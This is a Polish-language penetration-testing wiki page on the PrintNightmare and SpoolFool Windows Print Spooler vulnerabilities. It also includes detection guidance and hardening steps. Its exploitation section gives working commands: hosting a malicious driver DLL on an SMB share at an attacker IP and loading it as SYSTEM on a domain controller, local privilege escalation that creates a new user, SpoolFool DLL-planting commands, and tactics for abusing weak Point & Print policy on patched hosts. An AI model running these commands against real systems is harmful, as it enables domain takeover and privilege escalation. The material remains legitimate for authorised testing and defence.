# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare to zbiorcza nazwa rodziny podatności w usłudze Windows **Print Spooler**, które umożliwiają **wykonanie dowolnego kodu jako SYSTEM** oraz, gdy spooler jest dostępny przez RPC, **zdalne wykonanie kodu (RCE) na kontrolerach domeny i serwerach plików**. Najczęściej wykorzystywane CVE to **CVE-2021-1675** (początkowo sklasyfikowane jako LPE) oraz **CVE-2021-34527** (pełne RCE). Późniejsze problemy, takie jak **CVE-2021-34481 („Point & Print”)** i **CVE-2022-21999 („SpoolFool”)**, dowodzą, że powierzchnia ataku nadal jest daleka od pełnego zamknięcia.

Jeśli szukasz **authentication coercion / relay** przez spooler, a nie **driver-based RCE/LPE**, sprawdź [tę stronę dotyczącą nadużywania printer coercion](printers-spooler-service-abuse.md). Ta strona koncentruje się na **ładowaniu driverów / DLL jako SYSTEM**.

---

## 1. Podatne komponenty i CVE

| Rok | CVE | Krótka nazwa | Primitive | Uwagi |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Załatana w June 2021 CU, ale obejście umożliwiło CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` pozwala uwierzytelnionym użytkownikom ładować driver DLL ze zdalnego udziału; po August 2021 zazwyczaj wymaga to osłabionych zasad Point & Print|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalacja niepodpisanych driverów przez użytkowników niebędących administratorami|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Tworzenie dowolnych katalogów → DLL planting – działa po zastosowaniu patchy z 2021 roku|

Wszystkie te podatności wykorzystują jedną z **metod RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) lub relacje zaufania wewnątrz **Point & Print**.

## 2. Techniki Exploitation

### 2.1 Kompromitacja zdalnego Domain Controllera (CVE-2021-34527)

Uwierzytelniony, ale **nieuprzywilejowany** użytkownik domeny może uruchamiać dowolne DLL jako **NT AUTHORITY\SYSTEM** na zdalnym spoolerze (często na DC), wykonując:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popularne PoCs obejmują **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) oraz moduły `misc::printnightmare / lsa::addsid` autorstwa Benjamina Delpy’ego w **mimikatz**.

### 2.2 Lokalna eskalacja uprawnień (dowolny obsługiwany Windows, 2021-2024)

To samo API może zostać wywołane **lokalnie**, aby załadować driver z `C:\Windows\System32\spool\drivers\x64\3\` i uzyskać uprawnienia SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Nowoczesny triage na załatanych hostach

Na w pełni zaktualizowanym hoście publiczne PoC PrintNightmare często zawodzą, ponieważ Windows domyślnie zezwala obecnie na instalowanie sterowników drukarek wyłącznie administratorom (`RestrictDriverInstallationToAdministrators=1` od 10 sierpnia 2021 r.). Zanim użyjesz exploita przeciwko celowi, najpierw sprawdź, czy środowisko nie wycofało tej zmiany zabezpieczeń na potrzeby starszych wdrożeń drukarek:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Dwie najciekawsze słabe wartości to zazwyczaj:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Z systemu Linux szybko potwierdź, że cel udostępnia odpowiednie interfejsy print RPC przed uruchomieniem PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Nowsze publicznie dostępne narzędzia oferują również bezpieczniejszy przepływ pracy **check/list** przed wysłaniem biblioteki DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Jeśli jako użytkownik o niskich uprawnieniach otrzymasz `RPC_E_ACCESS_DENIED` (`0x8001011b`), zwykle oznacza to domyślne ustawienia wprowadzone po 2021 roku, a nie awarię transportu.

> W systemie Windows 11 22H2+ oraz nowszych kompilacjach klienckich drukowanie zdalne domyślnie korzysta z **RPC over TCP**, a **RPC over named pipes** (`\PIPE\spoolss`) jest wyłączone, chyba że zostanie jawnie ponownie włączone. Niektóre starsze PoC i notatki z labów nadal zakładają, że named pipe jest dostępny.

### 2.4 Nadużywanie Package Point & Print w „załatanych” sieciach

Wiele środowisk enterprise pozostało **podatnych ze względu na politykę** po zastosowaniu oryginalnych patchy z 2021 roku, ponieważ procesy helpdesku lub print-serverów nadal wymagały od użytkowników bez uprawnień administratora instalowania/aktualizowania driverów. W praktyce offensive playbook wygląda następująco:

- Jeśli security prompts są całkowicie wyłączone, **classic arbitrary-DLL PrintNightmare** nadal jest najkrótszą ścieżką.
- Jeśli włączono `Only use Package Point and Print`, zazwyczaj trzeba przejść do ścieżki **signed package-aware driver**, zamiast używać bezpośredniego zrzucenia raw DLL.
- Badania z 2024 roku wykazały, że **`Package Point and Print - Approved servers` nie stanowi samodzielnie ścisłej granicy zaufania**: jeśli attacker może spoofować lub przejąć name resolution dla jednego zatwierdzonego print servera, ofiary nadal mogą zostać przekierowane do malicious servera spełniającego checks polityki.
- Nawet połączenie UNC hardening z wymuszonym RPC-over-SMB może być zawodne, ponieważ nowoczesne clients mogą **przełączyć się awaryjnie na RPC over TCP**.

Dlatego współczesne exploity w stylu PrintNightmare często polegają bardziej na **nadużywaniu enterprise printer deployment policy** niż na ponownym odtwarzaniu oryginalnego PoC z 2021 roku bez zmian.

### 2.5 SpoolFool (CVE-2022-21999) – omijanie poprawek z 2021 roku

Patche Microsoftu z 2021 roku blokowały zdalne ładowanie driverów, ale **nie zabezpieczały uprawnień do katalogów**. SpoolFool wykorzystuje parametr `SpoolDirectory` do utworzenia dowolnego katalogu w `C:\Windows\System32\spool\drivers\`, umieszcza payload DLL i wymusza na spoolerze jej załadowanie:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit działa na w pełni zaktualizowanych systemach Windows 7 → Windows 11 oraz Server 2012R2 → 2022 przed aktualizacjami z lutego 2022 r.

---

## 3. Wykrywanie i hunting

* **Logi PrintService** – włącz kanał *Microsoft-Windows-PrintService/Operational* i monitoruj **Event ID 316** (dodano/zaktualizowano sterownik, zwykle zawiera nazwy DLL) zarówno podczas udanych, jak i nieudanych prób. Połącz go z **Event ID 808/811**, aby wykrywać podejrzane błędy ładowania modułów/sterowników spoolera.
* **Sysmon** – `Event ID 7` (załadowano obraz) lub `11/23` (zapis/usunięcie pliku) w obrębie `C:\Windows\System32\spool\drivers\*`, gdy procesem nadrzędnym jest **spoolsv.exe**.
* **Linia procesów** – generuj alert za każdym razem, gdy **spoolsv.exe** uruchamia `cmd.exe`, `rundll32.exe`, PowerShell lub dowolny nieoczekiwany, niepodpisany proces potomny.
* **Telemetria sieciowa** – nieoczekiwane pobieranie przez SMB z `spoolsv.exe` z udziałów kontrolowanych przez attackera lub nietypowy ruch RPC drukarek z serwerów, które nie powinny działać jako serwery druku, to sygnały o wysokiej wartości diagnostycznej.

## 4. Mitigacja i hardening

1. **Zainstaluj poprawki!** – zastosuj najnowszą aktualizację zbiorczą na każdym hoście Windows, na którym zainstalowana jest usługa Print Spooler.
2. **Wyłącz spooler tam, gdzie nie jest wymagany**, szczególnie na Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Zablokuj połączenia zdalne**, nadal zezwalając na drukowanie lokalne – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Ogranicz Point & Print wyłącznie do administratorów**, ustawiając:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Szczegółowe wskazówki znajdują się w Microsoft KB5005652
5. Jeśli wymagania biznesowe wymuszają `RestrictDriverInstallationToAdministrators=0`, traktuj każdą inną politykę drukarek wyłącznie jako **częściową mitigację**. Co najmniej preferuj **package-aware drivers**, włącz **Only use Package Point and Print** i ogranicz **Package Point and Print - Approved servers** do jawnie określonych print servers w lesie.
6. **Nie wycofuj ochrony prywatności printer RPC** tylko po to, aby naprawić niedziałające mapowania drukarek. Środowiska, które ustawiają `RpcAuthnLevelPrivacyEnabled=0`, cofają hardening dodany dla **CVE-2021-1678** i zwykle wymagają dodatkowej analizy podczas engagementu.

---

## 5. Powiązane badania / tools

* Moduły [`mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardowa implementacja Impacket z trybami `-check`, `-list` i `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper z wbudowanym dostarczaniem przez SMB, obsługą wielu celów oraz trybami `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – wykorzystanie własnego, podatnego sterownika drukarki poprzez package Point & Print
* Exploit i write-up dotyczące SpoolFool
* Mikropoprawki 0patch dla SpoolFool i innych błędów spoolera

Jeśli chcesz **wymusić uwierzytelnianie** za pośrednictwem spoolera zamiast ładować sterownik, przejdź do [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

* Microsoft – *KB5005652: Zarządzanie nowym domyślnym zachowaniem instalacji sterowników Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *Praktyczny przewodnik po PrintNightmare w 2024 roku*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *PrintNightmare jeszcze się nie skończył*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
